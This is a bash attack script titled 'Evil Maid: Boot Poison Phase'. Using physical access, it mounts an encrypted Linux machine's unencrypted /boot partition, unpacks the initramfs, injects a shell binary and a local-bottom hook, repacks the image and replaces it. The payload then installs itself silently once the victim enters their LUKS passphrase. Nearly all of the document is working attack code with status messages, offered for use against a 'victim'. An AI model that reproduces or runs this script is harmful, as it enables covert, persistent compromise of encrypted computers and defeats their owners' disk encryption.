#!/bin/bash
# poison_boot.sh
# Single-access LUKS attack: injects em_shell into the victim's initramfs.
# The payload installs itself silently after the victim enters their passphrase on next boot.
# Only /boot (always unencrypted) needs to be accessible — no passphrase required.
#
# Run from any Linux live USB (Ubuntu, Kali, Parrot, etc.)
# Requirements: unmkinitramfs (apt install initramfs-tools), cpio, gzip, python3

usage() {
    echo "Usage: $0 -b <boot_partition> [-k <kernel_version>]"
    echo ""
    echo "  -b <partition>  Unencrypted /boot or EFI partition (e.g. /dev/sda1)"
    echo "  -k <version>    Kernel version to target (default: latest found)"
    echo "  -h              Show this help"
    echo ""
    echo "Examples:"
    echo "  $0 -b /dev/sda1"
    echo "  $0 -b /dev/sda1 -k 5.15.0-91-generic"
    echo ""
    echo "Tip: run 'lsblk -f' to find the unencrypted boot partition."
    exit 1
}

BOOT_PARTITION=""
KERNEL_VER=""
BOOT_MOUNT="/mnt/victim_boot"
WORK_DIR="/tmp/em_initrd_work"
NEW_INITRD="/tmp/em_initrd_new.img"

while getopts ":b:k:h" opt; do
    case $opt in
        b) BOOT_PARTITION="$OPTARG" ;;
        k) KERNEL_VER="$OPTARG" ;;
        h) usage ;;
        :) echo "[!] Option -$OPTARG requires an argument."; usage ;;
        \?) echo "[!] Unknown option -$OPTARG"; usage ;;
    esac
done

[ -z "$BOOT_PARTITION" ] && { echo "[!] Boot partition required (-b)."; usage; }
[ ! -f ./em_shell ]       && { echo "[!] em_shell binary not found in current directory."; exit 1; }
[ ! -f ./em_inject_hook ] && { echo "[!] em_inject_hook not found in current directory."; exit 1; }

command -v unmkinitramfs &>/dev/null || {
    echo "[!] unmkinitramfs not found. Run: apt install initramfs-tools"
    exit 1
}

command -v python3 &>/dev/null || {
    echo "[!] python3 not found. Run: apt install python3"
    exit 1
}

echo "--- Evil Maid: Boot Poison Phase ---"
echo "[*] Boot partition : $BOOT_PARTITION"

# ── Mount /boot ───────────────────────────────────────────────────────────────

mkdir -p "$BOOT_MOUNT"
mountpoint -q "$BOOT_MOUNT" || mount "$BOOT_PARTITION" "$BOOT_MOUNT" || {
    echo "[!] Failed to mount $BOOT_PARTITION."
    exit 1
}
echo "[+] Boot partition mounted at $BOOT_MOUNT."

# ── Locate initrd ─────────────────────────────────────────────────────────────

if [ -z "$KERNEL_VER" ]; then
    KERNEL_VER=$(ls "$BOOT_MOUNT"/vmlinuz-* 2>/dev/null | sort -V | tail -1 | sed 's|.*/vmlinuz-||')
    [ -z "$KERNEL_VER" ] && { echo "[!] No kernel found on $BOOT_PARTITION. Wrong partition?"; umount "$BOOT_MOUNT"; exit 1; }
fi

INITRD="$BOOT_MOUNT/initrd.img-$KERNEL_VER"
[ ! -f "$INITRD" ] && { echo "[!] initrd not found: $INITRD"; umount "$BOOT_MOUNT"; exit 1; }
echo "[+] Target initrd : initrd.img-$KERNEL_VER"

# ── Backup original initrd ────────────────────────────────────────────────────

BAK_DIR="$BOOT_MOUNT/.bak"
mkdir -p "$BAK_DIR"
cp "$INITRD" "$BAK_DIR/initrd.img-$KERNEL_VER.bak" || {
    echo "[!] Could not write backup to $BAK_DIR — aborting."
    umount "$BOOT_MOUNT"
    exit 1
}
echo "[+] Original initrd backed up to $BAK_DIR/initrd.img-$KERNEL_VER.bak"
echo "    Restore with: cp $BAK_DIR/initrd.img-$KERNEL_VER.bak $INITRD"

# ── Extract initramfs ─────────────────────────────────────────────────────────

rm -rf "$WORK_DIR" && mkdir -p "$WORK_DIR"
unmkinitramfs "$INITRD" "$WORK_DIR" 2>/dev/null
echo "[+] initramfs extracted."

# unmkinitramfs extracts each section to a numbered subdir (0/, 1/, ...)
# On VMs there is usually just one section (no microcode prefix).
# We identify the main section as the one containing /scripts.
MAIN_DIR=""
for dir in "$WORK_DIR"/*/; do
    [ -d "${dir}scripts" ] && { MAIN_DIR="${dir%/}"; break; }
done

# Fallback: single-section extracted directly to WORK_DIR (older unmkinitramfs)
[ -z "$MAIN_DIR" ] && [ -d "$WORK_DIR/scripts" ] && MAIN_DIR="$WORK_DIR"

[ -z "$MAIN_DIR" ] && {
    echo "[!] Could not identify main initramfs section."
    echo "    Extracted dirs:"
    ls -la "$WORK_DIR/"
    umount "$BOOT_MOUNT"
    exit 1
}
echo "[+] Main initramfs section : $MAIN_DIR"

# ── Inject payload ────────────────────────────────────────────────────────────

cp ./em_shell "$MAIN_DIR/bin/em_shell"
chmod +x "$MAIN_DIR/bin/em_shell"

# local-bottom scripts run after LUKS is unlocked and root is mounted at ${rootmnt}
mkdir -p "$MAIN_DIR/scripts/local-bottom"
cp ./em_inject_hook "$MAIN_DIR/scripts/local-bottom/em_inject" || {
    echo "[!] Failed to copy hook into initramfs."
    umount "$BOOT_MOUNT"
    exit 1
}
chmod +x "$MAIN_DIR/scripts/local-bottom/em_inject"

# Add hook to ORDER so initramfs actually executes it
printf '/scripts/local-bottom/em_inject "$@"\n[ -e /conf/param.conf ] && . /conf/param.conf\n' >> "$MAIN_DIR/scripts/local-bottom/ORDER"
echo "[+] Hook added to local-bottom ORDER."

echo "[+] em_shell binary and hook injected into initramfs."

# ── Verify payload before repacking ──────────────────────────────────────────

if [ ! -f "$MAIN_DIR/scripts/local-bottom/em_inject" ]; then
    echo "[!] Hook not found in work dir — aborting."
    umount "$BOOT_MOUNT"
    exit 1
fi
if [ ! -x "$MAIN_DIR/scripts/local-bottom/em_inject" ]; then
    echo "[!] Hook not executable in work dir — aborting."
    umount "$BOOT_MOUNT"
    exit 1
fi
echo "[+] Hook verified in work dir — proceeding to repack."

# ── Repack initramfs ──────────────────────────────────────────────────────────
# Strategy: preserve early/microcode sections byte-for-byte using TRAILER!!!
# offset, then repack main section with gzip (universally accepted by kernel).

> "$NEW_INITRD"

if [ "$MAIN_DIR" = "$WORK_DIR" ]; then
    # Single-section initramfs — repack everything with gzip
    echo "[+] Single-section initramfs detected — repacking with gzip."
    (cd "$WORK_DIR" && find . | cpio -H newc -o 2>/dev/null | gzip -9) >> "$NEW_INITRD"
else
    # Multi-section: find offset where early sections end and main begins
    # Look for the last TRAILER!!! followed by a compression magic byte
    echo "[+] Multi-section initramfs detected — preserving early sections."

    OFFSET=$(python3 -c "
data = open('$INITRD', 'rb').read()
# Find all TRAILER!!! occurrences and use the last one before the main section
idx = 0
last = 0
while True:
    pos = data.find(b'TRAILER!!!', idx)
    if pos == -1:
        break
    last = pos
    idx = pos + 1

# Advance past TRAILER!!! and padding to find compression magic
i = last + len(b'TRAILER!!!')
while i < len(data):
    # gzip magic
    if data[i:i+2] == b'\x1f\x8b':
        break
    # zstd magic
    if data[i:i+4] == b'\x28\xb5\x2f\xfd':
        break
    # lz4 legacy magic
    if data[i:i+4] == b'\x02\x21\x4c\x18':
        break
    i += 1
print(i)
")

    echo "[+] Early section ends at byte offset: $OFFSET"

    # Preserve early sections byte-for-byte
    dd if="$INITRD" bs=1 count="$OFFSET" of="$NEW_INITRD" 2>/dev/null
    echo "[+] Early sections preserved."

    # Repack main section with gzip and append
    (cd "$MAIN_DIR" && find . | cpio -H newc -o 2>/dev/null | gzip -9) >> "$NEW_INITRD"
    echo "[+] Main section repacked with gzip."
fi

# ── Verify hook is present in new initramfs ───────────────────────────────────

if ! lsinitramfs "$NEW_INITRD" 2>/dev/null | grep -q "scripts/local-bottom/em_inject"; then
    echo "[!] Hook NOT found in repacked initramfs — restoring original and aborting."
    cp "$BAK_DIR/initrd.img-$KERNEL_VER.bak" "$INITRD"
    rm -rf "$WORK_DIR" "$NEW_INITRD"
    umount "$BOOT_MOUNT"
    exit 1
fi
echo "[+] Hook confirmed present in repacked initramfs."

# ── Replace initrd and clean up ───────────────────────────────────────────────

cp "$NEW_INITRD" "$INITRD"
rm -rf "$WORK_DIR" "$NEW_INITRD"
umount "$BOOT_MOUNT"

echo "[+] initramfs repacked and replaced."
echo "[+] Done. Payload installs silently when victim next boots and enters their passphrase."